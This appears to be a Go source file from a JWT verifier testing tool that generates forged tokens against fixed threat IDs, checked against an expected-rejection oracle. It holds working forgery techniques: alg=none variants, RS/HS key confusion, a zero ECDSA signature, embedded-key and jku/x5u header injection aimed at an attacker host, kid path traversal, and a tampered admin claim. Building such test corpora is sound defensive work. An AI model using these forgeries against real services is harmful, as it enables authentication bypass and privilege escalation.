package attack

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"strings"
	"time"
)

// GenContext holds the keys and expected values the generators build tokens
// around: a trusted issuer key (what a correct verifier trusts) and an
// attacker-controlled key (what forgeries are signed with).
type GenContext struct {
	IssuerKey      *rsa.PrivateKey
	AttackerKey    *rsa.PrivateKey
	Issuer         string
	Audience       string
	RequiredClaims []string
	Now            time.Time
}

// NewContext builds a GenContext with fresh keys and sensible defaults, plus the
// matching Policy for the reference oracle (same trust key / issuer / audience).
func NewContext() (GenContext, Policy, error) {
	issuer, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return GenContext{}, Policy{}, err
	}
	attacker, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return GenContext{}, Policy{}, err
	}
	now := time.Now()
	ctx := GenContext{
		IssuerKey: issuer, AttackerKey: attacker,
		Issuer: "https://issuer.keyway.test", Audience: "payments-api",
		RequiredClaims: []string{"scope"}, Now: now,
	}
	pol := Policy{
		TrustedKey: &issuer.PublicKey, Issuer: ctx.Issuer, Audience: ctx.Audience,
		RequiredClaims: ctx.RequiredClaims, Now: now, Skew: 60 * time.Second,
	}
	return ctx, pol, nil
}

func (c GenContext) baseClaims() map[string]any {
	m := map[string]any{
		"iss": c.Issuer,
		"aud": c.Audience,
		"sub": "user-1",
		"iat": c.Now.Unix(),
		"nbf": c.Now.Add(-time.Minute).Unix(),
		"exp": c.Now.Add(time.Hour).Unix(),
	}
	for _, rc := range c.RequiredClaims {
		m[rc] = "read"
	}
	return m
}

func header(alg string, extra map[string]any) map[string]any {
	h := map[string]any{"alg": alg, "typ": "JWT"}
	for k, v := range extra {
		h[k] = v
	}
	return h
}

// Corpus generates the full attack-token corpus for the given context.
func Corpus(c GenContext) ([]Token, error) {
	var out []Token
	var errs []string
	add := func(t Token, err error) {
		if err != nil {
			errs = append(errs, fmt.Sprintf("%s/%s: %v", t.ThreatID, t.Name, err))
			return
		}
		out = append(out, t)
	}

	// signed builds header.payload signed by signer (which may return "" for a
	// deliberately empty/absent signature).
	signed := func(threat, name, why string, self bool, expect Verdict, hdr, claims any,
		signer func(input string) (string, error)) (Token, error) {
		input, err := signingInput(hdr, claims)
		if err != nil {
			return Token{ThreatID: threat, Name: name}, err
		}
		sig, err := signer(input)
		if err != nil {
			return Token{ThreatID: threat, Name: name}, err
		}
		return Token{ThreatID: threat, Name: name, Rationale: why, JWS: assemble(input, sig),
			Expect: expect, SelfContained: self}, nil
	}
	rs256Issuer := func(input string) (string, error) { return signRS256(input, c.IssuerKey) }
	rs256Attacker := func(input string) (string, error) { return signRS256(input, c.AttackerKey) }
	emptySig := func(string) (string, error) { return "", nil }

	// --- control -------------------------------------------------------------
	add(signed("CONTROL", "valid_token", "a correctly-signed token must be accepted", true, Accept,
		header("RS256", map[string]any{"kid": "trusted"}), c.baseClaims(), rs256Issuer))

	// --- signature -----------------------------------------------------------
	add(signed("SIG-01", "alg_none", "alg=none must be rejected", true, Reject,
		header("none", nil), c.baseClaims(), emptySig))
	add(signed("SIG-03", "empty_signature_rs256", "a signing alg with an empty signature must fail", true, Reject,
		header("RS256", nil), c.baseClaims(), emptySig))
	// SIG-02 tampered signature: valid token with a mutated payload but the old sig.
	add(tamperedToken(c))

	// --- algorithm -----------------------------------------------------------
	// ALG-01 RS/HS confusion: sign HS256 with the trusted RSA *public key* PEM.
	pubPEM, err := publicKeyPEM(&c.IssuerKey.PublicKey)
	if err == nil {
		add(signed("ALG-01", "alg_confusion_rs_hs", "an RS-keyed verifier must reject HS256", true, Reject,
			header("HS256", nil), c.baseClaims(),
			func(input string) (string, error) { return signHS256(input, pubPEM), nil }))
	} else {
		errs = append(errs, "ALG-01: "+err.Error())
	}
	// ALG-03 alg case/whitespace variants of "none".
	for _, v := range []string{"None", "NONE", "nOnE", "none "} {
		add(signed("ALG-03", "alg_none_variant_"+strings.TrimSpace(strings.ToLower(v)),
			"alg matching must be exact; variants of none must be rejected", true, Reject,
			header(v, nil), c.baseClaims(), emptySig))
	}
	// ALG-04 psychic signature: ES256 header, all-zero r||s signature.
	add(signed("ALG-04", "psychic_signature_es256", "degenerate ECDSA (0,0) must be rejected", true, Reject,
		header("ES256", nil), c.baseClaims(),
		func(string) (string, error) { return b64.EncodeToString(make([]byte, 64)), nil }))

	// --- header key injection -----------------------------------------------
	// HDR-03 embedded jwk: token carries the attacker's public key; signed by the
	// attacker. Self-contained (no callback): a target that trusts the embedded
	// key accepts it.
	if jwk, jerr := jwkJSON(&c.AttackerKey.PublicKey); jerr == nil {
		add(signed("HDR-03", "embedded_jwk", "a key embedded in the token header must not verify that token", true, Reject,
			header("RS256", map[string]any{"jwk": jwk}), c.baseClaims(), rs256Attacker))
	} else {
		errs = append(errs, "HDR-03: "+jerr.Error())
	}
	// HDR-01 jku / HDR-02 x5u: NOT self-contained — a vulnerable target fetches the
	// attacker key set from the header URL, which requires Keyway to host it. The
	// token is generated and oracle-validated, but does not count toward coverage.
	add(signed("HDR-01", "jku_injection", "key material must never come from a token-supplied URL", false, Reject,
		header("RS256", map[string]any{"kid": "attacker", "jku": "https://attacker.keyway.test/jwks.json"}),
		c.baseClaims(), rs256Attacker))
	add(signed("HDR-02", "x5u_injection", "the verifier must ignore token-supplied x5u URLs", false, Reject,
		header("RS256", map[string]any{"x5u": "https://attacker.keyway.test/cert.pem"}),
		c.baseClaims(), rs256Attacker))
	// HDR-05 kid path traversal → empty key: kid points at /dev/null; HS256 signed
	// with an empty secret. A target that resolves kid to a file and uses its
	// contents as the HMAC key accepts it. Self-contained.
	add(signed("HDR-05", "kid_path_traversal", "kid must be an opaque lookup key, never a path", true, Reject,
		header("HS256", map[string]any{"kid": "../../../../../../dev/null"}), c.baseClaims(),
		func(input string) (string, error) { return signHS256(input, []byte{}), nil }))

	// --- claims --------------------------------------------------------------
	expired := c.baseClaims()
	expired["exp"] = c.Now.Add(-time.Hour).Unix()
	add(signed("CLM-01", "expired", "an expired token must be rejected", true, Reject,
		header("RS256", nil), expired, rs256Issuer))

	future := c.baseClaims()
	future["nbf"] = c.Now.Add(time.Hour).Unix()
	future["exp"] = c.Now.Add(2 * time.Hour).Unix()
	add(signed("CLM-02", "not_yet_valid", "a token before its nbf must be rejected", true, Reject,
		header("RS256", nil), future, rs256Issuer))

	wrongIss := c.baseClaims()
	wrongIss["iss"] = "https://evil.keyway.test"
	add(signed("CLM-03", "wrong_issuer", "a token from an unexpected issuer must be rejected", true, Reject,
		header("RS256", nil), wrongIss, rs256Issuer))

	wrongAud := c.baseClaims()
	wrongAud["aud"] = "some-other-service"
	add(signed("CLM-04", "wrong_audience", "a token for another audience must be rejected", true, Reject,
		header("RS256", nil), wrongAud, rs256Issuer))

	// CLM-06 aud type confusion: aud as an array that excludes the expected value.
	audArr := c.baseClaims()
	audArr["aud"] = []any{"some-other-service", "and-another"}
	add(signed("CLM-06", "aud_array_confusion", "array-encoded aud must still be matched, not bypassed", true, Reject,
		header("RS256", nil), audArr, rs256Issuer))

	// CLM-08 missing exp.
	noExp := c.baseClaims()
	delete(noExp, "exp")
	add(signed("CLM-08", "missing_exp", "a token with no expiry must be rejected where expiry is required", true, Reject,
		header("RS256", nil), noExp, rs256Issuer))

	// --- encoding / parsing --------------------------------------------------
	// ENC-01 extra segments: a valid JWS with a fourth segment appended.
	add(extraSegmentsToken(c))
	// ENC-02 non-base64url: header/payload encoded with padded std base64.
	add(nonB64URLToken(c))

	if len(errs) > 0 {
		return out, fmt.Errorf("attack: corpus generation errors: %s", strings.Join(errs, "; "))
	}
	return out, nil
}

// tamperedToken signs a valid token, then flips a payload claim while keeping the
// original signature — the signature no longer matches the payload.
func tamperedToken(c GenContext) (Token, error) {
	t := Token{ThreatID: "SIG-02", Name: "tampered_signature",
		Rationale: "claims must not be trusted unless the signature verifies", Expect: Reject, SelfContained: true}
	input, err := signingInput(header("RS256", nil), c.baseClaims())
	if err != nil {
		return t, err
	}
	sig, err := signRS256(input, c.IssuerKey)
	if err != nil {
		return t, err
	}
	tampered := c.baseClaims()
	tampered["sub"] = "admin"
	newInput, err := signingInput(header("RS256", nil), tampered)
	if err != nil {
		return t, err
	}
	t.JWS = assemble(newInput, sig)
	return t, nil
}

// extraSegmentsToken appends a fourth segment to an otherwise-valid JWS.
func extraSegmentsToken(c GenContext) (Token, error) {
	t := Token{ThreatID: "ENC-01", Name: "extra_segments",
		Rationale: "a JWS must have exactly three segments", Expect: Reject, SelfContained: true}
	input, err := signingInput(header("RS256", nil), c.baseClaims())
	if err != nil {
		return t, err
	}
	sig, err := signRS256(input, c.IssuerKey)
	if err != nil {
		return t, err
	}
	t.JWS = assemble(input, sig) + "." + b64.EncodeToString([]byte("extra"))
	return t, nil
}

// nonB64URLToken produces a token whose payload segment carries base64 padding
// ('='), which is never present in a canonical base64url JWS segment. A strict
// parser must reject it at decode time. (Encoding the segment with StdEncoding is
// not reliably non-canonical — for many payloads it coincides with base64url — so
// the padding is forced explicitly.)
func nonB64URLToken(c GenContext) (Token, error) {
	t := Token{ThreatID: "ENC-02", Name: "non_base64url",
		Rationale: "segments must be strict base64url without padding", Expect: Reject, SelfContained: true}
	h, err := encodeSegment(header("RS256", nil))
	if err != nil {
		return t, err
	}
	p, err := encodeSegment(c.baseClaims())
	if err != nil {
		return t, err
	}
	input := h + "." + p
	sig, err := signRS256(input, c.IssuerKey)
	if err != nil {
		return t, err
	}
	// Corrupt the payload segment's encoding with a padding char.
	t.JWS = h + "." + p + "=" + "." + sig
	return t, nil
}

func publicKeyPEM(pub *rsa.PublicKey) ([]byte, error) {
	der, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		return nil, err
	}
	return pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: der}), nil
}
